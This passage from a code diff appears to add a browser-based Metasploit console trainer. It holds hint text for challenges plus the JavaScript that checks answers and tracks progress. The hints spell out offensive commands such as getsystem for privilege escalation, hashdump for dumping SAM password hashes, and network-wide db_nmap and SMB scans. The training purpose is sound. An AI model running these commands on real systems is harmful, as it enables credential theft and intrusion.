+  '6-2': [
+    'A single-word Meterpreter command for the current user.',
+    'Not whoami. The Meterpreter version starts with "get".',
+    'Type: <code>getuid</code>',
+  ],
+  '6-3': [
+    'A single-word Meterpreter command. Pattern: get + system.',
+    'Tries Named Pipe Impersonation, Token Duplication, and other LPE techniques.',
+    'Type: <code>getsystem</code>',
+  ],
+  '6-4': [
+    'A single Meterpreter command for SAM hash dumping.',
+    'It\'s exactly two words concatenated: hash + dump.',
+    'Type: <code>hashdump</code>',
+  ],
+  '7-1': [
+    'It starts with db_.',
+    'You want the database connection status.',
+    'Type: <code>db_status</code>',
+  ],
+  '7-2': [
+    'The workspace command takes a flag to add a new one.',
+    'Flag is -a, then the workspace name.',
+    'Type: <code>workspace -a acme</code>',
+  ],
+  '7-3': [
+    'The msfconsole-integrated nmap is db_nmap.',
+    'You need -sV (version detection) and the CIDR target.',
+    'Type: <code>db_nmap -sV 10.10.10.0/24</code>',
+  ],
+  '8-1': [
+    'Same "use" pattern as for exploits.',
+    'The path is auxiliary/scanner/smb/smb_version.',
+    'Type: <code>use auxiliary/scanner/smb/smb_version</code>',
+  ],
+  '8-2': [
+    'Same "set RHOSTS" pattern — but the value is a CIDR range.',
+    'The range is 10.10.10.0/24.',
+    'Type: <code>set RHOSTS 10.10.10.0/24</code>',
+  ],
+  '8-3': [
+    'A single-word command to fire the scanner.',
+    'For auxiliary modules the convention is "run" (exploit also works).',
+    'Type: <code>run</code>',
+  ],
+};
+
+function escapeHtml(s){
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+const challengeIds = ['1-1','1-2','1-3','2-1','2-2','2-3','3-1','3-2','3-3','3-4','4-1','4-2','4-3','5-1','5-2','5-3','6-1','6-2','6-3','6-4','7-1','7-2','7-3','8-1','8-2','8-3'];
+const TOTAL = challengeIds.length;
+const histories = {};
+const histPos = {};
+
+function setupChallenge(id){
+  const input = document.getElementById('i-'+id);
+  const term = document.getElementById('t-'+id);
+  const prefix = document.getElementById('p-'+id);
+  if(!input || !term) return;
+  histories[id] = histories[id] || [];
+  histPos[id] = -1;
+
+  // Restore solved state
+  if(state.completed[id]){
+    const ch = document.getElementById('ch-'+id);
+    if(ch) ch.classList.add('solved');
+    const st = document.getElementById('st-'+id);
+    if(st){ st.textContent='solved'; st.classList.add('solved'); }
+  }
+
+  input.addEventListener('keydown', async (e) => {
+    if(e.key==='ArrowUp'){
+      e.preventDefault();
+      const h = histories[id];
+      if(h.length===0) return;
+      if(histPos[id] < h.length-1) histPos[id]++;
+      input.value = h[h.length - 1 - histPos[id]] || '';
+      return;
+    }
+    if(e.key==='ArrowDown'){
+      e.preventDefault();
+      const h = histories[id];
+      if(histPos[id] > 0){ histPos[id]--; input.value = h[h.length - 1 - histPos[id]] || ''; }
+      else { histPos[id] = -1; input.value = ''; }
+      return;
+    }
+    if(e.key !== 'Enter') return;
+    const cmd = input.value;
+    if(!cmd.trim()) return;
+    histories[id].push(cmd);
+    histPos[id] = -1;
+    input.value = '';
+
+    // Echo command
+    const promptHtml = prefix ? prefix.innerHTML : '&gt;';
+    appendTerm('t-'+id, [{text: promptHtml + ' <span class="term-cmd">'+ escapeHtml(cmd) +'</span>', cls:''}]);
+
+    // Builtins
+    const lc = cmd.trim().toLowerCase();
+    if(lc === 'clear'){ clearTerm('t-'+id); return; }
+    if(lc === 'help' || lc === '?'){
+      appendTerm('t-'+id, [
+        {text:'<span class="term-dim">// Trainer builtins: clear, help. Otherwise type the command the challenge asks for.</span>', cls:''},
+        {text:'<span class="term-dim">// ↑/↓ for command history.</span>', cls:''},
+      ]);
+      return;
+    }
+    if(lc === 'exit' || lc === 'quit' || lc === 'back'){
+      appendTerm('t-'+id, [{text:'<span class="term-dim">// (would exit/back in real msfconsole — stay here to finish the challenge)</span>', cls:''}]);
+      return;
+    }
+
+    const validator = CH[id];
+    if(!validator){ appendTerm('t-'+id, [{text:'<span class="term-err">no validator wired up</span>', cls:''}]); return; }
+    const result = validator.validate(cmd);
+    appendTerm('t-'+id, result.output);
+
+    if(result.ok && !state.completed[id]){
+      state.completed[id] = true;
+      saveState();
+      const ch = document.getElementById('ch-'+id);
+      if(ch) ch.classList.add('solved');
+      const st = document.getElementById('st-'+id);
+      if(st){ st.textContent='solved'; st.classList.add('solved'); }
+      updateProgress();
+      toast('CHALLENGE '+id+' SOLVED');
+    }
+  });
+}
+
+function hint(id, level){
+  const box = document.getElementById('h-'+id);
+  const arr = HINTS[id];
+  if(!box || !arr) return;
+  const text = arr[level-1] || '(no hint)';
+  box.innerHTML = '<strong>Hint '+level+':</strong> '+text;
+  box.classList.add('show');
+  state.hintsUsed = (state.hintsUsed||0) + 1;
+  saveState();
+  updateProgress();
+}
+
+function updateProgress(){
+  const counts = {1:[0,3],2:[0,3],3:[0,4],4:[0,3],5:[0,3],6:[0,4],7:[0,3],8:[0,3]};
+  let total = 0;
+  challengeIds.forEach(id => {
+    const m = parseInt(id.split('-')[0],10);
+    if(state.completed[id]){ counts[m][0]++; total++; }
+  });
+  for(let m=1; m<=8; m++){
+    const [done, max] = counts[m];
+    const pct = Math.round((done/max)*100);
+    const bar = document.getElementById('prog-'+m);
+    const txt = document.getElementById('progt-'+m);
+    if(bar) bar.style.width = pct+'%';
+    if(txt) txt.textContent = done+' / '+max;
+  }
+  const sd = document.getElementById('stat-done');
+  const sh = document.getElementById('stat-hints');
+  const sp = document.getElementById('stat-pct');
+  if(sd) sd.textContent = total+' / '+TOTAL;
+  if(sh) sh.textContent = state.hintsUsed||0;
+  if(sp) sp.textContent = Math.round((total/TOTAL)*100)+'%';
+}
+
+function toast(msg){
+  const el = document.getElementById('toast');
+  if(!el) return;
+  el.textContent = msg;
+  el.classList.add('show');
+  setTimeout(()=>el.classList.remove('show'), 2200);
+}
+
+function exportState(){
+  const json = JSON.stringify(state);
+  const enc = btoa(unescape(encodeURIComponent(json)));
+  const ta = document.getElementById('export-text');
+  if(ta) ta.value = enc;
+  document.getElementById('modal-export').classList.add('show');
+}
+function copyExport(){
+  const ta = document.getElementById('export-text');
+  if(!ta) return;
+  ta.select();
+  try{ navigator.clipboard.writeText(ta.value); toast('COPIED'); }
+  catch(e){ document.execCommand('copy'); toast('COPIED'); }
+}
+function showImport(){
+  document.getElementById('import-text').value = '';
+  document.getElementById('modal-import').classList.add('show');
+}
+function closeModal(id){
+  const el = document.getElementById(id);
+  if(el) el.classList.remove('show');
+}
+function doImport(){
+  const ta = document.getElementById('import-text');
+  if(!ta) return;
+  const v = ta.value.trim();
+  if(!v){ toast('NOTHING TO IMPORT'); return; }
+  try{
+    const json = decodeURIComponent(escape(atob(v)));
+    const obj = JSON.parse(json);
+    state = Object.assign({completed:{}, hintsUsed:0}, obj);
+    saveState();
+    closeModal('modal-import');
+    // Rewire UI for newly-solved challenges
+    challengeIds.forEach(id => {
+      const ch = document.getElementById('ch-'+id);
+      const st = document.getElementById('st-'+id);
+      if(state.completed[id]){
+        if(ch) ch.classList.add('solved');
+        if(st){ st.textContent='solved'; st.classList.add('solved'); }
+      } else {
+        if(ch) ch.classList.remove('solved');
+        if(st){ st.textContent='unsolved'; st.classList.remove('solved'); }
+      }
+    });
+    updateProgress();
+    toast('IMPORTED');
+  }catch(e){
+    toast('IMPORT FAILED');
+  }
+}
+function resetAll(){
+  if(!confirm('Reset all progress? This cannot be undone.')) return;
+  try{ localStorage.removeItem(STORE_KEY); }catch(e){}
+  location.reload();
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  loadState();
+  challengeIds.forEach(setupChallenge);
+  updateProgress();
+  // Auto-run first demo so the page feels alive on load
+  if(demos.d1) runDemo('demo-1', demos.d1);
+});
+
+// Active section highlighting
+window.addEventListener('scroll', () => {
+  const links = document.querySelectorAll('.nav-item');
+  let active = null;
+  for(let m=1; m<=8; m++){
+    const sec = document.getElementById('mod-'+m);
+    if(sec && sec.getBoundingClientRect().top < 120) active = m;
+  }
+  links.forEach((l,i) => l.classList.toggle('active', (i+1)===active));
+});
+</script>
+</body>
+</html>
